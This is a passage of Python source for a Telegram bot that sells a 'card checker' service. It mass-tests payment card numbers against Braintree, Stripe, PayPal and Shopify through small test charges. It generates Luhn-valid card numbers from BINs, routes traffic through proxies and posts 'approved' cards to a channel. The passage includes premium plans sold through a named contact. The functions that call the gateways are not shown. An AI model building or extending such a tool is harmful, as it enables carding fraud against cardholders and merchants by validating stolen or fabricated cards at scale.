
• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id)
    elif is_premium(user_id):
        remaining, expiry_date = get_subscription_info(user_id)
        
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
 💎 SUBSCRIPTION INFO 💎
╚═══════════════════════╝

• You have a Premium subscription 💰
• Remaining: {remaining}
• Expiry: {expiry_date}
• Enjoy unlimited card checks 🛒

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

📋 Premium Plans:
• 7 days - $3 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id)
    else:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
  🔓 FREE ACCOUNT 🔓
╚═══════════════════════╝

• You are using a Free account 🔓
• Limit: 15 cards per check 📊

╔═══════════════════════╗
 💰 PREMIUM FEATURES 💰
╚═══════════════════════╝
• Unlimited card checks 🛒
• Priority processing ⚡
• No waiting time 🚀

╔═══════════════════════╗
  💰 PREMIUM PLANS 💰
╚═══════════════════════╝
• 7 days - $3 💵
• 30 days - $10 💵

• Contact @mhitzxg to purchase 📩""", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['genkey'])
def generate_key(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, "❌ You are not authorized to generate keys.", reply_to_message_id=msg.message_id)

    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, "❌ Usage: /genkey <validity_days>", reply_to_message_id=msg.message_id)
            
        validity = int(parts[1])
        import random, string
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

        if store_key(key, validity):
            send_long_message(msg.chat.id, f"🔑 Generated Key:\n\n`{key}`\n\n✅ Valid for {validity} days", parse_mode='Markdown', reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, "❌ Error storing key in database", reply_to_message_id=msg.message_id)
    except ValueError:
        send_long_message(msg.chat.id, "❌ Please provide a valid number of days", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"❌ Error generating key: {str(e)}", reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['redeem'])
def redeem_key(msg):
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, "❌ Usage: /redeem <KEY>", reply_to_message_id=msg.message_id)
            
        user_key = parts[1]
        key_data = is_key_valid(user_key)
        if not key_data:
            return send_long_message(msg.chat.id, "❌ Invalid or already used key.", reply_to_message_id=msg.message_id)

        if mark_key_as_used(user_key, msg.from_user.id) and add_premium(msg.from_user.id, msg.from_user.first_name, key_data['validity_days']):
            # Send notification to admin
            user_info = get_user_info(msg.from_user.id)
            subscription_info = get_subscription_info(msg.from_user.id)
            
            notification = f"""
╔═══════════════════════╗
       🎟️ PREMIUM REDEEMED 🎟️
╚═══════════════════════╝

👤 User: {user_info['full_name']}
🆔 ID: <code>{msg.from_user.id}</code>
📱 Username: {user_info['username']}
🎫 Type: {user_info['user_type']}

🗓️ Validity: {key_data['validity_days']} days
🔑 Key: <code>{user_key}</code>
📅 Expiry: {subscription_info[1]}

⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

⚡ Powered by @mhitzxg
"""

            notify_admin(notification)
            send_long_message(msg.chat.id, f"✅ Key redeemed successfully!\n🎟️ Subscription valid for {key_data['validity_days']} days.", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, "❌ Error redeeming key. Please try again.", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"❌ Error redeeming key: {str(e)}", reply_to_message_id=msg.message_id)

# ---------------- Register Command ---------------- #

@bot.message_handler(commands=['register'])
def register_user(msg):
    """Register a new user"""
    user_id = msg.from_user.id
    first_name = msg.from_user.first_name or "User"
    
    # Check if user is already registered
    if is_authorized(msg):
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ✅ ALREADY REGISTERED ✅
╚═══════════════════════╝

• You are already registered!
• You can now use the bot commands""", reply_to_message_id=msg.message_id)
        return
        
    # Add user to free_users table
    if add_free_user(user_id, first_name):
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
     ✅ REGISTRATION SUCCESS ✅
╚═══════════════════════╝

• Welcome {first_name}! You are now registered.
• You can now use the bot commands

📋 Available Commands:
• /br - Check single card (Braintree)
• /mbr - Mass check cards (Braintree)
• /ch - Check single card (Stripe)
• /mch - Mass check cards (Stripe)
• /pp - Check single card (PayPal)
• /mpp - Mass check cards (PayPal)
• /gen - Generate cards
• /info - Your account info
• /subscription - Premium plans

• Enjoy your free account! 🔓""", reply_to_message_id=msg.message_id)
    else:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ REGISTRATION ERROR ⚠️
╚═══════════════════════╝

• Error: Database connection failed
• Please try again or contact admin: @mhitzxg""", reply_to_message_id=msg.message_id)

# ---------------- Info Command ---------------- #

@bot.message_handler(commands=['info'])
def user_info(msg):
    """Show user information"""
    user_id = msg.from_user.id
    user_data = get_user_info(user_id)
    remaining, expiry_date = get_subscription_info(user_id)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    info_message = f"""
╔═══════════════════════╗
        👤 USER INFORMATION 👤
╚═══════════════════════╝

👤 Name: {user_data['full_name']}
🆔 User ID: `{user_data['user_id']}`
📱 Username: {user_data['username']}
🎫 Account Type: {user_data['user_type']}

💰 Subscription: {remaining}
📅 Expiry Date: {expiry_date}
⏰ Current Time: {current_time}

🌐 STATUS 🌐 -

🔌 Proxy: {check_proxy_status()}
🔓 Authorized: {'Yes ✅' if is_authorized(msg) else 'No ❌'}

⚡ Powered by @mhitzxg"""
    
    send_long_message(msg.chat.id, info_message, parse_mode='Markdown', reply_to_message_id=msg.message_id)

# ---------------- Gen Command ---------------- #

@bot.message_handler(commands=['gen'])
def gen_handler(msg):
    """Generate cards using Luhn algorithm"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can generate cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check if user provided a pattern
    args = msg.text.split(None, 1)
    if len(args) < 2:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card pattern to generate
• Usage: `/gen <pattern>`

Valid formats:
`/gen 483318` - Just BIN (6+ digits)
`/gen 483318|12|25|123` - BIN with MM/YY/CVV
`/gen 472927xx` - Pattern with x's

• Use 'x' for random digits
• BIN must be at least 6 digits
• Example: `/gen 483318` or `/gen 483318|12|25|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    pattern = args[1]
    
    # Show processing message
    processing = send_long_message(msg.chat.id, """

 ♻️  ⏳ GENERATING CARDS ⏳  ♻️


• Your cards are being generated...
• Please wait a moment

✗ Using Luhn algorithm for valid cards""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def generate_and_reply():
        try:
            # Generate 10 cards using the pattern
            cards, error = card_generator.generate_cards(pattern, 10)
            
            if error:
                edit_long_message(msg.chat.id, processing.message_id, f"""
❌ GENERATION FAILED ❌

{error}

✗ Contact admin if you need help: @mhitzxg""")
                return
            
            # Extract BIN from pattern for the header
            bin_match = re.search(r'(\d{6})', pattern.replace('|', '').replace('x', '').replace('X', ''))
            bin_code = bin_match.group(1) if bin_match else "N/A"
            
            # Format the cards
            formatted_cards = []
            for card in cards:
                formatted_cards.append(card)
            
            # Get user info
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            
            # Create the final message with BIN info header
            final_message = f"""
BIN: {bin_code}
Amount: {len(cards)}

""" + "\n".join(formatted_cards) + f"""

Info: N/A
Issuer: N/A
Country: N/A

👤 Generated by: {user_info}
⚡ Powered by @mhitzxg & @pr0xy_xd"""
            
            # Send the generated cards without Markdown parsing
            edit_long_message(msg.chat.id, processing.message_id, final_message, parse_mode=None)
            
        except Exception as e:
            error_msg = f"""
❌ GENERATION ERROR ❌

Error: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
            edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode=None)

    threading.Thread(target=generate_and_reply).start()

@bot.message_handler(commands=['gentxt'])
def gentxt_handler(msg):
    """Generate cards and send as text file"""
    try:
        print(f"Received gentxt command from {msg.from_user.id}: {msg.text}")
        
        if not is_authorized(msg):
            return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can generate cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Check if user provided a pattern
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card pattern to generate
• Usage: `/gentxt <pattern>`

Valid formats:
`/gentxt 483318` - Just BIN (6+ digits)
`/gentxt 483318|12|25|123` - BIN with MM/YY/CVV
`/gentxt 472927xx` - Pattern with x's

• Use 'x' for random digits
• BIN must be at least 6 digits
• Example: `/gentxt 483318` or `/gentxt 483318|12|25|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        pattern = args[1]
        print(f"Pattern to generate: {pattern}")
        
        # Show processing message
        processing = send_long_message(msg.chat.id, """

 ♻️  ⏳ GENERATING CARDS ⏳  ♻️


• Your cards are being generated...
• Please wait a moment

✗ Creating text file with valid cards""", reply_to_message_id=msg.message_id)
        
        if isinstance(processing, list) and len(processing) > 0:
            processing = processing[0]

        def generate_and_send_file():
            try:
                print(f"Starting card generation for pattern: {pattern}")
                
                # Generate cards (50 cards for text file)
                cards, error = card_generator.generate_cards(pattern, 50)
                
                if error:
                    print(f"Card generation error: {error}")
                    edit_long_message(msg.chat.id, processing.message_id, f"""
❌ GENERATION FAILED ❌

{error}

✗ Contact admin if you need help: @mhitzxg""")
                    return
                
                print(f"Successfully generated {len(cards)} cards")
                
                # Extract BIN from pattern for filename
                bin_match = re.search(r'(\d{6})', pattern.replace('|', '').replace('x', '').replace('X', ''))
                bin_code = bin_match.group(1) if bin_match else "cards"
                
                # Create text file content - ONLY CARDS, NOTHING ELSE
                file_content = "\n".join(cards)
                
                # Send as text file
                try:
                    # Delete processing message first
                    bot.delete_message(msg.chat.id, processing.message_id)
                    print("Deleted processing message")
                except Exception as e:
                    print(f"Could not delete processing message: {e}")
                
                # Send the file
                import io
                file_buffer = io.BytesIO(file_content.encode('utf-8'))
                file_buffer.name = f'{bin_code}_cards.txt'
                
                print(f"Sending file with {len(cards)} cards")
                bot.send_document(
                    msg.chat.id,
                    file_buffer,
                    caption=f"✅ Generated {len(cards)} cards with BIN: {bin_code}",
                    reply_to_message_id=msg.message_id
                )
                print("File sent successfully")
                
            except Exception as e:
                print(f"Error in generate_and_send_file: {e}")
                error_msg = f"""
❌ GENERATION ERROR ❌

Error: {str(e)}

✗ Contact admin if you need help: @mhitzxg"""
                try:
                    edit_long_message(msg.chat.id, processing.message_id, error_msg, parse_mode=None)
                except:
                    send_long_message(msg.chat.id, error_msg, reply_to_message_id=msg.message_id)

        threading.Thread(target=generate_and_send_file).start()
        print("Started generation thread")
        
    except Exception as e:
        print(f"Error in gentxt_handler: {e}")
        send_long_message(msg.chat.id, f"""
❌ COMMAND ERROR ❌

Error: {str(e)}

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
# ---------------- Bot Commands ---------------- #

@bot.message_handler(commands=['start'])
def start_handler(msg):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_id = msg.from_user.id
    
    # Auto-register user if not already registered
    if not is_authorized(msg) and msg.chat.type == "private":
        if add_free_user(user_id, msg.from_user.first_name or "User"):
            welcome_note = "\n✅ You have been automatically registered!"
        else:
            welcome_note = "\n❓ Use /register to get access"
    else:
        welcome_note = ""
    
    welcome_message = f"""
  ╔═══════════════════════╗
     ★ 𝗠𝗛𝗜𝗧𝗭𝗫𝗚  𝗔𝗨𝗧𝗛  𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ★
┌───────────────────────┐
│ ✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {msg.from_user.first_name or 'User'}! ✨
├───────────────────────┤
│ 📋 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
│
│ • /br     - Braintree Auth ❌
│ • /mbr    - Mass Braintree Auth❌
│ • /ch     - Stripe Auth✅
│ • /mch    - Mass Stripe Auth✅
│ • /pp     - PayPal Charge 2$✅
│ • /mpp    - Mass PayPal 2$✅
│ • /sh     - Shopify Charge 13.98$✅
│ • /mpp    - Shopify Mass 13.98$✅
│ • /gen    - Generate Cards 🎰
├───────────────────────┤
│ 📓 𝗙𝗿𝗲𝗲 𝗧𝗶𝗲𝗿:
│ • 25 cards per check 📊
│ • Standard speed 🐢
├───────────────────────┤
│ 📌 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝘂𝘀: {check_proxy_status()}
├───────────────────────┤
│✨𝗳𝗼𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀
│📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @mhitzxg 
│❄️ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd
└───────────────────────┘
"""
    
    send_long_message(msg.chat.id, welcome_message, reply_to_message_id=msg.message_id)

@bot.message_handler(commands=['auth'])
def auth_user(msg):
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
   ╔═══════════════════════╗
    🔰 ADMIN PERMISSION REQUIRED 🔰
   ╚═══════════════════════╝

• Only admins can authorize users
• Contact an admin for assistance""", reply_to_message_id=msg.message_id)
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
  ⚡ INVALID USAGE ⚡
╚═══════════════════════╝

• Usage: `/auth <user_id>`
• Example: `/auth 1234567890`""", reply_to_message_id=msg.message_id)
        
        user_id = int(parts[1])
        
        # Check if user is already authorized
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Cannot connect to database""", reply_to_message_id=msg.message_id)
            
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM free_users WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        
        if result:
            return send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
  ✅ ALREADY AUTHORIZED ✅
╚═══════════════════════╝

• User `{user_id}` is already authorized
• No action needed""", reply_to_message_id=msg.message_id)
        
        # Add user to free_users table
        try:
            # Try to get user info from Telegram
            user_chat = bot.get_chat(user_id)
            first_name = user_chat.first_name or "User"
        except:
            first_name = "User"
            
        if add_free_user(user_id, first_name):
            send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
     ✅ USER AUTHORIZED ✅
╚═══════════════════════╝

• Successfully authorized user: `{user_id}`
• User can now use the bot in private chats""", reply_to_message_id=msg.message_id)
        else:
            send_long_message(msg.chat.id, """
╔═══════════════════════╗
        ⚠️ DATABASE ERROR ⚠️
╚═══════════════════════╝

• Failed to authorize user""", reply_to_message_id=msg.message_id)
        
    except ValueError:
        send_long_message(msg.chat.id, """
╔═══════════════════════╗
    ❌ INVALID USER ID ❌
╚═══════════════════════╝

• Please provide a valid numeric user ID
• Usage: `/auth 1234567890`""", reply_to_message_id=msg.message_id)
    except Exception as e:
        send_long_message(msg.chat.id, f"""
╔═══════════════════════╗
        ⚠️ ERROR ⚠️
╚═══════════════════════╝

• Error: {str(e)}""", reply_to_message_id=msg.message_id)

# ---------------- Shopify Commands ---------------- #

@bot.message_handler(commands=['sh'])
def sh_handler(msg):
    """Check single card using Shopify gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 AUTHORIZATION REQUIRED 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "sh"):
        return send_long_message(msg.chat.id, """

❌ ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """

❌ INVALID CARD FORMAT ❌


• The replied message doesn't contain a valid card
• Please use the correct format:

Valid format:
`/sh 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please provide a card to check
• Usage: `/sh <card_details>`

Valid format:
`/sh 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /sh

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "sh", 10)

    processing = send_long_message(msg.chat.id, """

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🛍️ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘 𝟭𝟯.𝟵𝟴$

🔮 Initializing Shopify Gateway...
🔄 Connecting to Shopify API
📡 Establishing secure connection

⏳ Status: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id)
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_shopify_loading(message_id, progress, status):
        """Update Shopify loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🛍️ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘 𝟭𝟯.𝟵𝟴$
🔮 {status}
🔄 Processing your request
📡 Contacting Shopify gateway

⏳ Status: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text)
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_shopify_loading(processing.message_id, 20, "Initializing Shopify...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_shopify_loading(processing.message_id, 40, "Connecting to Shopify API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_shopify_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_shopify_loading(processing.message_id, 80, "Processing Shopify request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_shopify_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_shopify(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['msh'])
def msh_handler(msg):
    """Mass check cards using Shopify gateway"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check for cooldown (10 minutes for free users)
    if check_cooldown(msg.from_user.id, "msh"):
        return send_long_message(msg.chat.id, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 10 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id)

    if not msg.reply_to_message:
        return send_long_message(msg.chat.id, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /msh
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return send_long_message(msg.chat.id, "❌ Empty text message.", reply_to_message_id=msg.message_id)

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return send_long_message(msg.chat.id, """

 ❌ NO VALID CARDS ❌


• No valid card formats found in the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id)

    # Check card limit for free users (10 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 10:
        return send_long_message(msg.chat.id, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 10 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""", reply_to_message_id=msg.message_id)

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return send_long_message(msg.chat.id, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""", reply_to_message_id=msg.message_id)

    # Set cooldown for free users (10 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "msh", 600)  # 10 minutes = 600 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Combined loading message with counter and status bar
    loading_msg = send_long_message(chat_id, f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🛍️ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦 𝗖𝗛𝗔𝗥𝗚𝗘 𝟭𝟯.𝟵𝟴$

📊 Total Cards: {total}
🎯 Gateway: Shopify Mass Charge 𝟭𝟯.𝟵𝟴$
🔮 Status: Preparing batch...

📊 Progress: [0/{total}] 
🕒 Time Elapsed: 0.00s

▰▱▱▱▱▱▱▱▱▱ 0%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""")
    
    if isinstance(loading_msg, list) and len(loading_msg) > 0:
        loading_msg = loading_msg[0]

    def update_combined_loading(message_id, progress, current, status, elapsed):
        """Update combined loading animation with counter and status bar"""
        bars = int(progress / 10)
        bar = "▰" * bars + "▱" * (10 - bars)
        loading_text = f"""

⚙️ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 - 🛍️ 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗠𝗔𝗦𝗦 𝗖𝗛𝗔𝗥𝗚𝗘 𝟭𝟯.𝟵𝟴$

📊 Total Cards: {total}
🎯 Gateway: Shopify Mass Charge 𝟭𝟯.𝟵𝟴$
🔮 Status: {status}

📊 Progress: [{current}/{total}] 
🕒 Time Elapsed: {elapsed:.2f}s

{bar} {progress}%

♻️ ⏳ PROCESSING CARDS ⏳ ♻️

• Mass check in progress...
• Please wait, this may take some time

⚡ {random.choice(['Validating cards...', 'Processing payments...', 'Checking limits...', 'Contacting gateway...'])}"""
        
        try:
            edit_long_message(chat_id, message_id, loading_text)
        except:
            pass

    approved, declined, checked = 0, 0, 0
    approved_cards = []  # To store all approved cards
    approved_message_id = None  # To track the single approved cards message
    start_time = time.time()

    def process_all():
        nonlocal approved, declined, checked, approved_cards, approved_message_id
        
        for i, cc in enumerate(cc_lines, 1):
            try:
                # Update combined loading animation
                progress = int((i / len(cc_lines)) * 100)
                elapsed = time.time() - start_time
                update_combined_loading(loading_msg.message_id, progress, i, f"Checking card {i}", elapsed)
                
                checked += 1
                result = check_card_shopify(cc.strip())
                if "APPROVED CC ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    # Format the result with the new information
                    formatted_result = result.replace(
                        "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
                    )
                    
                    approved_cards.append(formatted_result)  # Store approved card with original format
                    
                    # Send approved card to channel
                    notify_channel(formatted_result)
                    
                    # Create or update the single approved cards message
                    if approved_message_id is None:
                        # First approved card - create the message
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        approved_message = approved_header + formatted_result + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                        if sent_msg and hasattr(sent_msg, 'message_id'):
                            approved_message_id = sent_msg.message_id
                        elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                            approved_message_id = sent_msg[0].message_id
                    else:
                        # Update existing message with new approved card
                        approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
                        all_approved_cards = "\n\n".join(approved_cards)
                        approved_message = approved_header + all_approved_cards + f"""

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                        try:
                            edit_long_message(chat_id, approved_message_id, approved_message, parse_mode='HTML')
                        except:
                            # If message editing fails, send a new one
                            sent_msg = send_long_message(chat_id, approved_message, parse_mode='HTML')
                            if sent_msg and hasattr(sent_msg, 'message_id'):
                                approved_message_id = sent_msg.message_id
                            elif sent_msg and isinstance(sent_msg, list) and len(sent_msg) > 0:
                                approved_message_id = sent_msg[0].message_id
                else:
                    declined += 1

                time.sleep(1)  # Reduced sleep time for faster processing
            except Exception as e:
                send_long_message(user_id, f"❌ Error: {e}")

        # Update stats after processing all cards
        update_stats(approved=approved, declined=declined)
        for i in range(approved):
            update_user_stats(msg.from_user.id, approved=True)
        for i in range(declined):
            update_user_stats(msg.from_user.id, approved=False)

        # Delete the loading message
        try:
            bot.delete_message(chat_id, loading_msg.message_id)
        except:
            pass

        # Send final results in the approved message
        total_time = time.time() - start_time
        
        if approved_message_id is not None:
            # Update the approved cards message with final results
            approved_header = f"""
╔═══════════════════════╗
✅ APPROVED CARDS FOUND ✅
╚═══════════════════════╝

"""
            all_approved_cards = "\n\n".join(approved_cards)
            final_approved_message = approved_header + all_approved_cards + f"""

╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

🎯 Gateway: Shopify
⚡ Processing complete!

👤 Checked by: {get_user_info(msg.from_user.id)['username']}
🔌 Proxy: {check_proxy_status()}
"""
            try:
                edit_long_message(chat_id, approved_message_id, final_approved_message, parse_mode='HTML')
            except:
                # If editing fails, send as new message
                send_long_message(chat_id, final_approved_message, parse_mode='HTML')
        else:
            # No approved cards, send completion message
            final_message = f"""
╔═══════════════════════╗
✅ MASS CHECK COMPLETED ✅
╚═══════════════════════╝

📊 Final Results:
• ✅ Approved: {approved}
• ❌ Declined: {declined}
• 📋 Total: {total}
• ⏰ Time: {total_time:.2f}s

